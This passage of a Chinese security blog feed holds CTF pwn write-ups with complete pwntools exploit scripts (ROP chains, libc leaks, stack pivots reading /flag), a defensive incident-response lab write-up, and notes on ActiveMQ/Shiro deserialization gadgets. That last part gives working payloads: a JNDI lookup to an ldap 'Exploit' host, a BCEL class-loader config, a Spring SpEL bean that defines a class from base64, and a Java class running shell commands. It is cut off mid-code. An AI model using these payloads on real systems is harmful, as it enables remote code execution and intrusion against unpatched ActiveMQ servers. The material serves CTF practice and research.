class="hljs-string">&#x27;puts&#x27;</span>]open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]pop_rdx = libc_base + 0x142c92 pop_rsi = libc_base + 0x2601f payload_migration = b<span class="hljs-string">&#x27;a&#x27;</span> * (offset - 0x08) + p64(bss + 0x300 + 0x100) + p64(lea_rax)p.recvuntil(<span class="hljs-string">&#x27;lets move and pwn!&#x27;</span>)p.send(payload_migration)pause() payload = b<span class="hljs-string">&#x27;/flag\00\x00\x00&#x27;</span> + p64(pop_rdi) + p64(bss + 0x300) + p64(pop_rsi) + p64(0) + p64(open_addr)payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x300) + p64(pop_rdx) + p64(0x100) + p64(read_addr) payload += p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(bss + 0x300) + p64(pop_rdx) + p64(0x100) + p64(write_addr) payload = payload.ljust(0x100, b<span class="hljs-string">&#x27;\x00&#x27;</span>)payload += p64(bss + 0x300) + p64(leave) p.send(payload)p.interactive()</code></pre></div><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>看上去是一道堆题，其实还是栈题，仔细观察可以发现存在一个后门函数o_O，就是上一题中的vuln函数，故可以借用上题脚本。但是在此之外又增加了auth鉴权函数，好在其中也存在栈溢出，可以通过溢出修改srand(seed)中的seed，此处修改为了0x11111111，再调用c中的rand函数就可以计算出固定的随机数，转为字节之后即可绕过auth函数。进入add函数中的o_O函数之后，打上题脚本读取到flag。</p><div class="code-wrapper"><pre><code class="hljs Bash">import ctypesimport randomfrom pwn import *<span class="hljs-comment"># 加载 C 标准库</span>libc = ctypes.CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<span class="hljs-comment"># 定义 srand 函数的参数类型</span>libc.srand.argtypes = [ctypes.c_uint]<span class="hljs-comment"># 设置随机数种子</span>seed = 0x11111111libc.srand(seed)<span class="hljs-comment"># 生成 100 个随机数</span>random_numbers = [libc.rand()%100+1 <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(100)]context(<span class="hljs-built_in">arch</span> = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)p = remote(<span class="hljs-string">&#x27;ip&#x27;</span>,<span class="hljs-string">&#x27;port&#x27;</span>)elf = ELF(<span class="hljs-string">&#x27;./vuln&#x27;</span>)libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)offset = 0x100 + 0x08pop_rdi = 0x401893 pop_ret = 0x40101abss = 0x404300lea_rax = 0x4013CFputs_plt = elf.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]main_addr = 0x4013C0leave = 0x4013EE p.send(0x8*b<span class="hljs-string">&#x27;a&#x27;</span>+(0x12-0x8)*b<span class="hljs-string">&#x27;\x11&#x27;</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(100):        p.sendafter(<span class="hljs-string">&#x27;Input the authentication code:&#x27;</span>,random_numbers[i].to_bytes(1, <span class="hljs-string">&#x27;big&#x27;</span>))p.sendafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,b<span class="hljs-string">&#x27;\x01&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,b<span class="hljs-string">&#x27;\x01&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Note: &#x27;</span>,b<span class="hljs-string">&#x27;\x01&#x27;</span>)payload_leak = b<span class="hljs-string">&#x27;a&#x27;</span> * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr) <span class="hljs-comment">#p.recvuntil(&#x27;lets move and pwn!&#x27;)</span>p.send(payload_leak)puts_real_addr = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))libc_base = puts_real_addr - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]write_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]pop_rdx = libc_base + 0x142c92 pop_rsi = libc_base + 0x2601f payload_migration = b<span class="hljs-string">&#x27;a&#x27;</span> * (offset - 0x08) + p64(bss + 0x300 + 0x100) + p64(lea_rax)<span class="hljs-comment">#p.recvuntil(&#x27;lets move and pwn!&#x27;)</span>p.send(payload_migration)pause() payload = b<span class="hljs-string">&#x27;/flag\00\x00\x00&#x27;</span> + p64(pop_rdi) + p64(bss + 0x300) + p64(pop_rsi) + p64(0) + p64(open_addr)payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss + 0x300) + p64(pop_rdx) + p64(0x100) + p64(read_addr) payload += p64(pop_rdi) + p64(1) +p64(pop_rsi) + p64(bss + 0x300) + p64(pop_rdx) + p64(0x100) + p64(write_addr) payload = payload.ljust(0x100, b<span class="hljs-string">&#x27;\x00&#x27;</span>)payload += p64(bss + 0x300) + p64(leave) p.send(payload)p.interactive()</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>应急响应靶机</title>
    <link href="/2024/10/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/"/>
    <url>/2024/10/14/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="简单的学习一下应急响应"><a href="#简单的学习一下应急响应" class="headerlink" title="简单的学习一下应急响应"></a>简单的学习一下应急响应</h1><h2 id="Linux1"><a href="#Linux1" class="headerlink" title="Linux1"></a>Linux1</h2><p>由于根本不知道做什么，就尝试了下<code>history</code></p><p>defend用户没东西，root用户有一个flag</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014214958220.png" alt="image-20241014214958220"></p><p>然后看到<code>/etc/rc.d/rc.local</code>文件被修改</p><p>查看一下</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014215111130.png" alt="image-20241014215111130"></p><p>最后一个flag我在<code>/etc</code>目录下使用<code>cat *|grep flag</code>直接暴力输出</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014214814505.png" alt="image-20241014214814505"></p><p>可以发现是在redis配置文件中</p><p>然后是找黑客的ip，那就应该往redis连接方面想</p><p>找一下日志文件</p><p><code>cat redis.conf|grep log</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014220040447.png" alt="image-20241014220040447"></p><p>内容太多了，不知道连接上应该是咋样的</p><p>看了下wp，正则匹配Accepted</p><p>但我又想了下正则匹配ip的格式不就行了</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014221745479.png" alt="image-20241014221745479"></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014221842390.png" alt="image-20241014221842390"></p><h2 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h2><p>好多中文乱码，不会修改很烦</p><h3 id="flag3-flag2"><a href="#flag3-flag2" class="headerlink" title="flag3  flag2"></a>flag3  flag2</h3><p>先<code>history</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014225429149.png" alt="image-20241014225429149"></p><p>先找到一个flag3，然后知道服务的目录<code>/www/wwwroot/127.0.0.1</code></p><p>并且历史记录看到<code>.api</code>，在其中暴力搜索发现<code>flag2</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241014224911791.png" alt="image-20241014224911791"></p><p>然后不会了</p><p>看wp</p><h3 id="攻击者IP"><a href="#攻击者IP" class="headerlink" title="攻击者IP"></a>攻击者IP</h3><p>原来是启动了宝塔</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042014259.png" alt="image-20241016042014259"></p><p>访问服务，可以看日志</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042052021.png" alt="image-20241016042052021"></p><h3 id="攻击者修改的管理员密码-明文"><a href="#攻击者修改的管理员密码-明文" class="headerlink" title="攻击者修改的管理员密码(明文)"></a>攻击者修改的管理员密码(明文)</h3><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042501276.png" alt="image-20241016042501276"></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042523292.png" alt="image-20241016042523292"></p><h3 id="第一次Webshell的连接URL"><a href="#第一次Webshell的连接URL" class="headerlink" title="第一次Webshell的连接URL"></a>第一次Webshell的连接URL</h3><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042620716.png" alt="image-20241016042620716"></p><p>注册协议，对应<code>index.php?user-app-register</code></p><h3 id="Webshell连接密码"><a href="#Webshell连接密码" class="headerlink" title="Webshell连接密码"></a>Webshell连接密码</h3><p>上图，<code>Network2020</code></p><h3 id="数据包的flag1"><a href="#数据包的flag1" class="headerlink" title="数据包的flag1"></a>数据包的flag1</h3><p>在<code>/root</code>下有个<code>数据包1.pcapng</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042820074.png" alt="image-20241016042820074"></p><h3 id="攻击者使用的后续上传的木马文件名称"><a href="#攻击者使用的后续上传的木马文件名称" class="headerlink" title="攻击者使用的后续上传的木马文件名称"></a>攻击者使用的后续上传的木马文件名称</h3><p>这个好像也看不出来，对冰蝎webshell的流量特征不熟</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016042947922.png" alt="image-20241016042947922"></p><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>1.攻击者的shell密码<br>2.攻击者的IP地址<br>3.攻击者的隐藏账户名称<br>4.攻击者挖矿程序的矿池域名</p><h3 id="攻击者shell密码-rebeyond"><a href="#攻击者shell密码-rebeyond" class="headerlink" title="攻击者shell密码         rebeyond"></a>攻击者shell密码         rebeyond</h3><p>先找到服务的根目录</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016190013926.png" alt="image-20241016190013926"></p><p>这时候上个D盾这样的扫描器就行，我是随便点开来看，发现有个<code>plugins</code>觉得可疑，点开发现<code>shell.php</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016190301848.png" alt="image-20241016190301848"></p><h3 id="攻击者ip-192-168-126-1"><a href="#攻击者ip-192-168-126-1" class="headerlink" title="攻击者ip     192.168.126.1"></a>攻击者ip     192.168.126.1</h3><p>思路肯定是查看日志文件</p><p>我刚开始启动phpstudy，发现启动的是nginx，而不是apache，导致我去看了nginx的log，而不是apache的log</p><p>正确应该看的是apache的</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016190811318.png" alt="image-20241016190811318"></p><h3 id="攻击者的隐藏账户名称"><a href="#攻击者的隐藏账户名称" class="headerlink" title="攻击者的隐藏账户名称"></a>攻击者的隐藏账户名称</h3><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016193346381.png" alt="image-20241016193346381"></p><p>WP中使用windows远程登陆日志分析得到结果</p><h3 id="挖矿程序的矿池域名"><a href="#挖矿程序的矿池域名" class="headerlink" title="挖矿程序的矿池域名"></a>挖矿程序的矿池域名</h3><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016193358852.png" alt="image-20241016193358852"></p><p>该图标为pyinstaller打包，使用pyinstxtractor得到pyc文件后，再拿去反编译可以得到源码</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016193713705.png" alt="image-20241016193713705"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>1.攻击者的IP地址（两个）？<br>2.攻击者的webshell文件名？<br>3.攻击者的webshell密码？<br>4.攻击者的QQ号？<br>5.攻击者的服务器伪IP地址？<br>6.攻击者的服务器端口？<br>7.攻击者是如何入侵的（选择题）？<br>8.攻击者的隐藏用户名？</p><h3 id="ip-（1）"><a href="#ip-（1）" class="headerlink" title="ip  （1）"></a>ip  （1）</h3><p>只在apache的日志文件找到一个<code>192.168.126.135</code></p><h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>webshell文件名：<code>system.php</code></p><p>密码：<code>hack6618</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016204145386.png" alt="image-20241016204145386"></p><p>没思路了，看WP</p><h3 id="ip（2）"><a href="#ip（2）" class="headerlink" title="ip（2）"></a>ip（2）</h3><p>利用工具的windows日志分析，发现隐藏用户以及ip</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016214812732.png" alt="image-20241016214812732"></p><h3 id="qq"><a href="#qq" class="headerlink" title="qq"></a>qq</h3><p>在文件管理器可以发现frp，然后目录往前就可以发现<code>tencent file</code>大概就是qq了</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016215703047.png" alt="image-20241016215703047"></p><h3 id="服务器伪IP地址-端口"><a href="#服务器伪IP地址-端口" class="headerlink" title="服务器伪IP地址   端口"></a>服务器伪IP地址   端口</h3><p>有frp代理，那就看frpc.ini</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016221149955.png" alt="image-20241016221149955"></p><h3 id="攻击者是如何入侵的（选择题）"><a href="#攻击者是如何入侵的（选择题）" class="headerlink" title="攻击者是如何入侵的（选择题）"></a>攻击者是如何入侵的（选择题）</h3><p>可以在phpstudy的ftp的日志中发现利用文件上传了<code>system.php</code></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016221707702.png" alt="image-20241016221707702"></p><p>所以是<code>ftp攻击</code></p><h3 id="隐藏用户"><a href="#隐藏用户" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><p>net user发现不了隐藏用户</p><p>可以找注册表，或者找到c盘的用户目录</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016222235653.png" alt="image-20241016222235653"></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016222245119.png" alt="image-20241016222245119"></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241016222508769.png" alt="image-20241016222508769"></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>攻击者的两个IP地址<br>攻击者隐藏用户名称<br>三个攻击者留下的flag</p><h3 id="两个ip"><a href="#两个ip" class="headerlink" title="两个ip"></a>两个ip</h3><p>看apache的日志文件</p><p><code>192.168.75.129</code><br><code>192.168.75.130</code></p><h3 id="隐藏用户-1"><a href="#隐藏用户-1" class="headerlink" title="隐藏用户"></a>隐藏用户</h3><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241017000239102.png" alt="image-20241017000239102"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241017001736897.png" alt="image-20241017001736897"></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241017001807794.png" alt="image-20241017001807794"></p><p>然后就不会了，看WP</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241017003303294.png" alt="image-20241017003303294"></p><p>额额额，既然在是一个后台用户的话</p><p>那我phpstudy下个phpmyadmin直接看数据库不就行了</p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241017003517239.png" alt="image-20241017003517239"></p><p><img src="/../images/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA/image-20241017003221869.png" alt="image-20241017003221869"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ActiveMQ依赖存在的getter</title>
    <link href="/2024/09/27/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/"/>
    <url>/2024/09/27/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/</url>
    
    <content type="html"><![CDATA[<h1 id="ActiveMQ依赖存在的getter"><a href="#ActiveMQ依赖存在的getter" class="headerlink" title="ActiveMQ依赖存在的getter"></a>ActiveMQ依赖存在的getter</h1><h2 id="IniEnvironment分析"><a href="#IniEnvironment分析" class="headerlink" title="IniEnvironment分析"></a>IniEnvironment分析</h2><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042652383.png" alt="image-20240927042652383"></p><p><code>iniConfig</code>参数是<code>shiro.ini</code>配置文件的内容</p><p><a href="https://shiro.apache.org/configuration.html">https://shiro.apache.org/configuration.html</a></p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042926374.png" alt="image-20240927042926374"></p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span><span class="hljs-attr">user</span>=com.just.User       //别名=全类名<span class="hljs-attr">info</span>=com.just.Info<span class="hljs-attr">user.info</span>=<span class="hljs-variable">$info</span>             //引用也会调用setter<span class="hljs-attr">user.info.username</span>=anchor   //会调用setter<span class="hljs-attr">user.info.password</span>=<span class="hljs-number">123456</span>   //会调用setter</code></pre></div><p>类似于这种会调用getter</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">user.object.a</span>=<span class="hljs-number">1</span></code></pre></div><p>这样调用的是getObject</p><p>具体为什么会调用setter&#x2F;getter就自己调试吧</p><h3 id="会调用getter-setter就好办了"><a href="#会调用getter-setter就好办了" class="headerlink" title="会调用getter&#x2F;setter就好办了"></a>会调用getter&#x2F;setter就好办了</h3><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span><span class="hljs-attr">jdbc</span> = com.sun.rowset.jdbcRowsetImpl<span class="hljs-attr">jdbc.dataSourceName</span> =<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-attr">jdbc.autoCommit</span> = <span class="hljs-literal">true</span>      //调用setter</code></pre></div><h4 id="dbcp打BCEL"><a href="#dbcp打BCEL" class="headerlink" title="dbcp打BCEL"></a>dbcp打BCEL</h4><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[main]</span>bds = org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSource</span>bds<span class="hljs-selector-class">.driverClassLoader</span> = com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.ClassLoader</span>bds<span class="hljs-selector-class">.driverClassName</span> = <span class="hljs-string">&quot;$$BCEL$$.....&quot;</span>bds<span class="hljs-selector-class">.connection</span><span class="hljs-selector-class">.a</span> = <span class="hljs-selector-tag">a</span>         <span class="hljs-comment">//调用getConnection</span></code></pre></div><p>类似getter&#x2F;setter都可以</p><h2 id="ActiveMQObjectMessage-getObject-存在反序列化漏洞"><a href="#ActiveMQObjectMessage-getObject-存在反序列化漏洞" class="headerlink" title="ActiveMQObjectMessage#getObject()存在反序列化漏洞"></a>ActiveMQObjectMessage#getObject()存在反序列化漏洞</h2><p>利用上面IniEnvironment调用getter</p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927051901541.png" alt="image-20240927051901541"></p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927052815945.png" alt="image-20240927052815945"></p><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927051923752.png" alt="image-20240927051923752"></p><p>字节类型的属性可以通过 <code>base64</code> 来赋值或者十六编码来赋值</p><p>然后需要注意的就是修改 <code>trustAllPackages</code> ，不然会由于 <code>activemq</code> 默认存在反序列化黑名单，导致反序列化失败</p><p>由于自带shiro依赖，所以可以打cb链</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span><span class="hljs-attr">bs</span> = org.apache.activemq.util.ByteSequence<span class="hljs-attr">message</span> = org.apache.activemq.command.ActiveMQObjectMessage<span class="hljs-attr">bs.data</span> = rO0ABXNyABdqYXZh.....<span class="hljs-attr">bs.length</span> = <span class="hljs-number">1376</span>               //一定要有length<span class="hljs-attr">bs.offset</span> = <span class="hljs-number">0</span><span class="hljs-attr">message.content</span> = <span class="hljs-variable">$bs</span><span class="hljs-attr">message.trustAllPackages</span> = <span class="hljs-literal">true</span><span class="hljs-attr">message.object.x</span> = x          //调用getter</code></pre></div><h2 id="有回显exp"><a href="#有回显exp" class="headerlink" title="有回显exp"></a>有回显exp</h2><p><a href="https://github.com/Hutt0n0/ActiveMqRCE/tree/master">Hutt0n0&#x2F;ActiveMqRCE: 用java实现构造openwire协议，利用activeMQ &lt; 5.18.3 RCE 回显利用 内存马注入 (github.com)</a></p><div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:spring</span>=<span class="hljs-string">&quot;http://camel.apache.org/schema/spring&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">ignore-resource-not-found</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">ignore-unresolvable</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span></span><span class="language-xml"></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;base64Str&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span></span><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>yv66vgAAADQAtgoAKgBhCABi...........<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cmd&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span></span><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ls&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span>  <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;CMDResponse&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(base64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().test(cmd.toString())&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span></code></pre></div><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.io.OutputStream;<span class="hljs-keyword">import</span> java.lang.reflect.Field;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CMDResponse</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-type">String</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;            process = <span class="hljs-string">&quot;cmd.exe&quot;</span>;            arg = <span class="hljs-string">&quot;/c&quot;</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            process = <span class="hljs-string">&quot;/bin/sh&quot;</span>;            arg = <span class="hljs-string">&quot;-c&quot;</span>;        &#125;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;process,arg,cmd&#125;);            <span class="hljs-type">Process</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> processBuilder.start();            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> start.getInputStream();            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();            <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> <span 